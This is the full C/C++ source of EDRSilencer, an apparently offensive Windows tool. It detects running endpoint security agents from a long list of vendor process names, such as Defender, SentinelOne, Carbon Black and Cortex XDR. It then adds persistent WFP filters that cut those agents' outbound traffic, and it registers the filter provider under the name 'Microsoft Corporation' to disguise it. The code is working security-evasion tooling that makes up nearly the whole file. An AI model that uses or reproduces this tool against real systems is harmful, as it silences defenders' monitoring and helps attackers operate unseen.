#include "utils.h"
#include<string>
#include<iostream>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Fwpuclnt.lib")
#ifdef _MSC_VER
#define strcasecmp _stricmp
#endif

wchar_t* edrProcess[] = {
// Microsoft Defender for Endpoint and Microsoft Defender Antivirus
    L"MsMpEng.exe",
    L"MsSense.exe",
    L"SenseIR.exe",
    L"SenseNdr.exe",
    L"SenseCncProxy.exe",
    L"SenseSampleUploader.exe",
// Elastic EDR
    L"winlogbeat.exe",
   L"elastic-agent.exe",
   L"elastic-endpoint.exe",
    L"filebeat.exe",
// Trellix EDR
    L"xagt.exe",
// Qualys EDR
    L"QualysAgent.exe",
// SentinelOne
    L"SentinelAgent.exe",
    L"SentinelAgentWorker.exe",
    L"SentinelServiceHost.exe",
    L"SentinelStaticEngine.exe",
    L"LogProcessorService.exe",
    L"SentinelStaticEngineScanner.exe",
    L"SentinelHelperService.exe",
    L"SentinelBrowserNativeHost.exe",
// Cylance
    L"CylanceSvc.exe",
// Cybereason
    L"AmSvc.exe",
    L"CrAmTray.exe",
    L"CrsSvc.exe",
    L"ExecutionPreventionSvc.exe",
    L"CybereasonAV.exe",
// Carbon Black EDR
    L"cb.exe",
// Carbon Black Cloud
    L"RepMgr.exe",
    L"RepUtils.exe",
    L"RepUx.exe",
    L"RepWAV.exe",
    L"RepWSC.exe",
// Tanium
    L"TaniumClient.exe",
    L"TaniumCX.exe",
    L"TaniumDetectEngine.exe",
// Palo Alto Networks Traps/Cortex XDR
    L"Traps.exe",
    L"cyserver.exe",
    L"CyveraService.exe",
    L"CyvrFsFlt.exe",
// FortiEDR
    L"fortiedr.exe",
// Cisco Secure Endpoint (Formerly Cisco AMP)
    L"sfc.exe",
// ESET Inspect
    L"EIConnector.exe",
    L"ekrn.exe",
// Harfanglab EDR
    L"hurukai.exe",
//TrendMicro Apex One
    L"CETASvc.exe",
    L"WSCommunicator.exe",
    L"EndpointBasecamp.exe",
    L"TmListen.exe",
    L"Ntrtscan.exe",
    L"TmWSCSvc.exe",
    L"PccNTMon.exe",
    L"TMBMSRV.exe",
    L"CNTAoSMgr.exe",
    L"TmCCSF.exe"
};

// The "unblockall" feature will delete all filters that are based on the custom filter name
WCHAR* filterName = L"Custom Outbound Filter";
WCHAR* providerName = L"Microsoft Corporation";
// provider description has to be unique because:
// - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)
// - avoid removing legitimate WFP provider
WCHAR* providerDescription = L"Microsoft Windows WFP Built-in custom provider.";

BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };

// Check if the running process is our list
BOOL isInEdrProcessList(const wchar_t* procName) {
    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++) {
        if (wcscmp(procName, edrProcess[i]) == 0 && !inWfpFlag[i]) {
            inWfpFlag[i] = TRUE;
            return TRUE;
        }
    }
    return FALSE;
}

// Add WFP filters for all known EDR process(s)
void BlockEdrProcessTraffic() {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    HANDLE hProcessSnap = NULL;
    HANDLE hModuleSnap = NULL;
    PROCESSENTRY32 pe32 = {0};
    BOOL isEdrDetected = FALSE;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }
   
    EnableSeDebugPrivilege();

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\n", GetLastError());
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        printf("[-] Process32First failed with error code: 0x%x.\n", GetLastError());
        CloseHandle(hProcessSnap);
        return;
    }

    do {
        if (isInEdrProcessList(pe32.szExeFile)) {
            isEdrDetected = TRUE;
            printf("Detected running EDR process: %s (%d):\n", pe32.szExeFile, pe32.th32ProcessID);
            // Get full path of the running process
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                WCHAR fullPath[MAX_PATH] = {0};
                DWORD size = MAX_PATH;
                FWPM_FILTER_CONDITION0 cond = {0};
                FWPM_FILTER0 filter = {0};
                FWPM_PROVIDER0 provider = {0};
                GUID providerGuid = {0};
                FWP_BYTE_BLOB* appId = NULL;
                UINT64 filterId = 0;
                ErrorCode errorCode = CUSTOM_SUCCESS;
                
                QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
                errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
                if (errorCode != CUSTOM_SUCCESS) {
                    switch (errorCode) {
                        case CUSTOM_FILE_NOT_FOUND:
                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", fullPath);
                            break;
                        case CUSTOM_MEMORY_ALLOCATION_ERROR:
                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", fullPath);
                            break;
                        case CUSTOM_NULL_INPUT:
                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", fullPath);
                            break;
                        case CUSTOM_DRIVE_NAME_NOT_FOUND:
                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", fullPath);
                            break;
                        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", fullPath);
                            break;
                        default:
                            break;
                    }
                    CloseHandle(hProcess);
                    continue;
                } 

                // Sett up WFP filter and condition
                filter.displayData.name = filterName;
                filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
                filter.action.type = FWP_ACTION_BLOCK;
                UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
                filter.weight.type = FWP_UINT64;
                filter.weight.uint64 = &weightValue;
                cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
                cond.matchType = FWP_MATCH_EQUAL;
                cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
                cond.conditionValue.byteBlob = appId;
                filter.filterCondition = &cond;
                filter.numFilterConditions = 1;

                 // Add WFP provider for the filter
                if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                    filter.providerKey = &providerGuid;
                } else {
                    provider.displayData.name = providerName;
                    provider.displayData.description = providerDescription;
                    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
                    result = FwpmProviderAdd0(hEngine, &provider, NULL);
                    if (result != ERROR_SUCCESS) {
                        printf("    [-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
                    } else {
                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                            filter.providerKey = &providerGuid;
                        }
                    }
                }

                // Add filter to both IPv4 and IPv6 layers
                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
                } else {
                    printf("    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
                }
                
                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
                } else {
                    printf("    [-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
                }

                FreeAppId(appId);
                CloseHandle(hProcess);
            } else {
                printf("    [-] Could not open process \"%s\" with error code: 0x%x.\n", pe32.szExeFile, GetLastError());
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    if (!isEdrDetected) {
        printf("[-] No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\n");
    }
    CloseHandle(hProcessSnap);
    FwpmEngineClose0(hEngine);
    return;
}

// Add block WFP filter to user-defined process
void BlockProcessTraffic(char* fullPath) {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    WCHAR wFullPath[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    FWPM_FILTER_CONDITION0 cond = {0};
    FWPM_FILTER0 filter = {0};
    FWPM_PROVIDER0 provider = {0};
    GUID providerGuid = {0};
    FWP_BYTE_BLOB* appId = NULL;
    UINT64 filterId = 0;
    ErrorCode errorCode = CUSTOM_SUCCESS;
    
    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }
    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
    errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);
    if (errorCode != CUSTOM_SUCCESS) {
        switch (errorCode) {
            case CUSTOM_FILE_NOT_FOUND:
                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
                break;
            case CUSTOM_MEMORY_ALLOCATION_ERROR:
                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
                break;
            case CUSTOM_NULL_INPUT:
                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
                break;
            case CUSTOM_DRIVE_NAME_NOT_FOUND:
                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
                break;
            case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
                break;
            default:
                break;
        }
        return;
    }

    // Setting up WFP filter and condition
    filter.displayData.name = filterName;
    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_BLOCK;
    UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
    filter.weight.type = FWP_UINT64;
    filter.weight.uint64 = &weightValue;
    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;
    filter.filterCondition = &cond;
    filter.numFilterConditions = 1;

    // Add WFP provider for the filter
    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
        filter.providerKey = &providerGuid;
    } else {
        provider.displayData.name = providerName;
        provider.displayData.description = providerDescription;
        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
        result = FwpmProviderAdd0(hEngine, &provider, NULL);
        if (result != ERROR_SUCCESS) {
            printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
        } else {
            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                filter.providerKey = &providerGuid;
            }
        }
    }

    // Add filter to both IPv4 and IPv6 layers
    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
    } else {
        printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
    }

    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
    } else {
        printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
    }

    FreeAppId(appId);
    FwpmEngineClose0(hEngine);
    return;
}

// Remove all WFP filters previously created
void UnblockAllWfpFilters() {
    HANDLE hEngine = NULL;
    DWORD result = 0;
    HANDLE enumHandle = NULL;
    FWPM_FILTER0** filters = NULL;
    GUID providerGuid = {0};
    UINT32 numFilters = 0;
    BOOL foundFilter = FALSE;
    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }

    result = FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x.\n", result);
        return;
    }

    while(TRUE) {
        result = FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);

        if (result != ERROR_SUCCESS) {
            printf("[-] FwpmFilterEnum0 failed with error code: 0x%x.\n", result);
            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
            FwpmEngineClose0(hEngine);
            return;
        }

        if (numFilters == 0) {
			break;
        }
        
        FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;
        WCHAR* currentFilterName = data->name;
        if (wcscmp(currentFilterName, filterName) == 0) {
            foundFilter = TRUE;
            UINT64 filterId = filters[0]->filterId;
            result = FwpmFilterDeleteById0(hEngine, filterId);
            if (result == ERROR_SUCCESS) {
                printf("Deleted filter id: %llu.\n", filterId);
            } else {
                printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
            }
        }
    }

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
        result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);
        if (result != ERROR_SUCCESS) {
            if (result != FWP_E_IN_USE) {
                printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
            }
        } else {
            printf("Deleted custom WFP provider.\n");
        }
    }

    if (!foundFilter) {
        printf("[-] Unable to find any WFP filter created by this tool.\n");
    }
    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    FwpmEngineClose0(hEngine);
}

// Remove WFP filter based on filter id
void UnblockWfpFilter(UINT64 filterId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;
    GUID providerGuid = {0};

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }
    
    result = FwpmFilterDeleteById0(hEngine, filterId);

    if (result == ERROR_SUCCESS) {
        printf("Deleted filter id: %llu.\n", filterId);
    }
    else if (result == FWP_E_FILTER_NOT_FOUND) {
        printf("[-] The filter does not exist.\n");
    } else {
        printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
    }

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
        result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);
        if (result != ERROR_SUCCESS) {
            if (result != FWP_E_IN_USE) {
                printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
            }
        } else {
            printf("Deleted custom WFP provider.\n");
        }
    }

    FwpmEngineClose0(hEngine);
}

bool BlockIPA(const std::string& ip)
{
  HANDLE hEngine = nullptr;
  FWPM_FILTER filter = { 0 };
  FWPM_FILTER_CONDITION condition = { 0 };
  FWP_V4_ADDR_AND_MASK addrMask = { 0 };

  // 1. 初始化 WFP 引擎
  if (FwpmEngineOpen0(nullptr, RPC_C_AUTHN_WINNT, nullptr, nullptr, &hEngine) != ERROR_SUCCESS) {
    std::cerr << "Failed to open WFP engine." << std::endl;
    return false;
  }

  // 2. 设置过滤层 (阻塞 IPv4 出站连接)
  filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
  filter.action.type = FWP_ACTION_BLOCK; // 阻塞操作
  filter.filterCondition = &condition;
  filter.numFilterConditions = 1;
  filter.weight.type = FWP_EMPTY; // 默认权重
  filter.displayData.name = L"Block IP Filter";

  // 3. 设置过滤条件 (匹配指定IP地址)
  condition.fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
  condition.matchType = FWP_MATCH_EQUAL;
  condition.conditionValue.type = FWP_V4_ADDR_MASK;

  // 将 IP 地址转换为网络字节序
  struct in_addr addr;
  if (inet_pton(AF_INET, ip.c_str(), &addr) != 1) {
    std::cerr << "Invalid IP address format." << std::endl;
    FwpmEngineClose0(hEngine);
    return false;
  }

  addrMask.addr = htonl(addr.s_addr);  // 将地址转换为网络字节序
  addrMask.mask = 0xFFFFFFFF;  // 完全匹配 (255.255.255.255)
  condition.conditionValue.v4AddrMask = &addrMask;
  auto ret = ERROR_SUCCESS;
  // 4. 添加过滤规则
  if ((ret = FwpmFilterAdd0(hEngine, &filter, nullptr, nullptr)) != ERROR_SUCCESS) {
    std::cerr << "Failed to add filter." << ret << std::endl;
    FwpmEngineClose0(hEngine);
    return false;
  }

  std::cout << "Successfully blocked IP: " << ip << std::endl;

  // 5. 清理资源
  FwpmEngineClose0(hEngine);
  return true;
}

void PrintHelp() {
    printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
    printf("Version: 1.4\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
    printf("  EDRSilencer.exe blockedr\n\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n");
    printf("  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n");
    printf("- Remove all WFP filters applied by this tool:\n");
    printf("  EDRSilencer.exe unblockall\n\n");
    printf("- Remove a specific WFP filter based on filter id:\n");
    printf("  EDRSilencer.exe unblock <filter id>");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        PrintHelp();
        return 1;
    }

    if (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0) {
        PrintHelp();
        return 1;
    }
    
    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }

    if (strcmp(argv[1], "blockedr") == 0) {
        BlockEdrProcessTraffic();
    } else if (strcmp(argv[1], "block") == 0) {
        if (argc < 3) {
            printf("[-] Missing second argument. Please provide the full path of the process to block.\n");
            return 1;
        }
        BlockProcessTraffic(argv[2]);
    } else if (strcmp(argv[1], "unblockall") == 0) {
        UnblockAllWfpFilters();
    } else if (strcmp(argv[1], "unblock") == 0) {
        if (argc < 3) {
            printf("[-] Missing argument for 'unblock' command. Please provide the filter id.\n");
            return 1;
        }
        char *endptr;
        errno = 0;

        UINT64 filterId = strtoull(argv[2], &endptr, 10);

        if (errno != 0) {
            printf("[-] strtoull failed with error code: 0x%x.\n", errno);
            return 1;
        }

        if (endptr == argv[2]) {
            printf("[-] Please provide filter id in digits.\n");
            return 1;
        }
        UnblockWfpFilter(filterId);
    } 
    else if (strcmp(argv[1], "blockip") == 0) {
      if (argc < 3) {
        printf("[-] Missing argument for 'blockip' command. Please provide the filter ip.\n");
        return 1;
      }
      BlockIPA(argv[2]);
    }
    else {
        printf("[-] Invalid argument: \"%s\".\n", argv[1]);
        return 1;
    }
    return 0;
}